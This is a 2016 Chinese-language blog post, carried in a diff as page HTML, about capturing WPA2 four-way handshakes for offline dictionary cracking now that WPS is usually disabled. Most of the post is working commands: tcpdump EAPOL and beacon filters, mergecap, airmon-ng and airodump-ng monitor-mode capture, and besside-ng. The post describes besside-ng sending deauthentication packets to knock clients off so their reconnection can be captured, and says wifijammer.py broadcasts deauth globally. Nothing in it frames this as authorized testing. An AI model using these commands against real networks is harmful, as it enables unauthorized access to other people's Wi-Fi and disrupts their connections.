@@ -1,0 +1,35 @@
+<!DOCTYPE html><html lang="zh-Hans-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="theme-color" content="#db3333"><link rel="canonical" href="https://oao.moe/archives/574/"><title>抓 WPA2 握手. · 云羽的羽毛</title>            <meta name="description" content="!phoo_2016-06-03_14-35-32hps://oao.moe/wp-conen/upoads/2016/06/phoo_2016-06-03_14-35-32-300x51.jpghps://oao.moe/wp-conen/upoads/2016/06/phoo_2016-06-03_14-35-32.jpg;现在大部分人都学精了,然后 WPS 都关了,这就十分尴尬了.;抓握手的话,基本点的方式是用 cpdump.">
+            <meta name="keywords" content="cap,我们,quot,bssid,handshake,eapol,tcpdump,ether,然后,beacon">        <meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="https://oao.moe/atom.xml" title="云羽的羽毛"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link active">ARCHIVES</a></li><li class="nav-list-item"><a href="/about/" target="_self" class="nav-list-link">ABOUT</a></li><li class="nav-list-item"><a href="/links/" target="_self" class="nav-list-link">LINKS</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">抓 WPA2 握手.</h1><div class="post-info">Jun 3, 2016</div><div class="post-content"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><p>现在大部分人都学精了,然后 WPS 都关了,这就十分尴尬了.</p>
+<p>不过我们还是有个老办法,抓握手然后跑字典.</p>
+<p>抓握手的话,基本点的方式是用 tcpdump.</p>
+<pre><code>tcpdump &quot;ether proto 0x888e and ether host 'bssid'&quot; -I -U -vvv -i en0 -w eapol.cap
+tcpdump &quot;type mgt subtype beacon and ether src 'bssid'&quot; -I -c 1 -i en0 -w beacon.cap
+</code></pre>
+<p>其中记得将 bssid 替换为 Wi-Fi 的 bssid.在捕获 eapol 的时候你需要等待 Got 0 变为 Got 4,这样你就抓到了 4-way 的握手,然后我们把它合并为你要跑的 *.cap.</p>
+<pre><code>mergecap -a -F pcap -w handshake.cap beacon.cap eapol.cap
+</code></pre>
+<p>handshake.cap 就是我们需要的文件了.</p>
+<pre><code>[![photo_2016-06-03_14-35-32](https://oao.moe/wp-content/uploads/2016/06/photo_2016-06-03_14-35-32-300x51.jpg)](https://oao.moe/wp-content/uploads/2016/06/photo_2016-06-03_14-35-32.jpg)
+使用 Wireshark 查看 handshake.cap
+</code></pre>
+<p>或者我们可以使用 aircrack-ng. aircrack 套件中你可以直接用 airodump-ng 来抓取.</p>
+<pre><code>airmon-ng start wlan0 #打开监听模式
+airodump-ng wlan0mon
+#可以指定 bssid
+airodump-ng wlan0mon --bssid
+</code></pre>
+<p>当然还有高级点的,besside-ng.</p>
+<pre><code>besside-ng wlan0mon
+besside-ng wlan0mon -b #bssid
+</code></pre>
+<p>besside-ng 会发送 deauth 包让对方的客户端断开连接,他们重新连接的时候,我们就可以抓到 handshake 了.</p>
+<p>PS:wifijammer.py 也是这个方法,全局广播 deauth.</p>
+<br><blockquote><a rel="external nofollow noopener noreferrer" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-sa/4.0/80x15.png"></a><br>This work is licensed under a <a rel="external nofollow noopener noreferrer" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License</a>.</blockquote></div></article></div></main><footer><div class="paginator"><a href="/archives/578/" class="prev">上一篇</a><a href="/archives/572/" class="next">下一篇</a></div><div id="disqus_thread"></div><script>var disqus_shortname = 'kumowa';
+var disqus_identifier = 'archives/574/';
+var disqus_title = '抓 WPA2 握手.';
+var disqus_url = 'https://oao.moe/archives/574/';
+(function() {
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+})();</script><script id="dsq-count-scr" src="//kumowa.disqus.com/count.js" async></script><div class="copyright"><p>© 2015 - 2018 <a href="https://oao.moe">zhangyubaka</a>, with <a href="http://www.vultr.com/?ref=6853828" target="_blank" rel="external nofollow noopener noreferrer">Vultr</a>, powered by <a href="https://hexo.io/" target="_blank" rel="external nofollow noopener noreferrer">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank" rel="external nofollow noopener noreferrer">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-65933410-1",'auto');ga('send','pageview');</script></body></html>
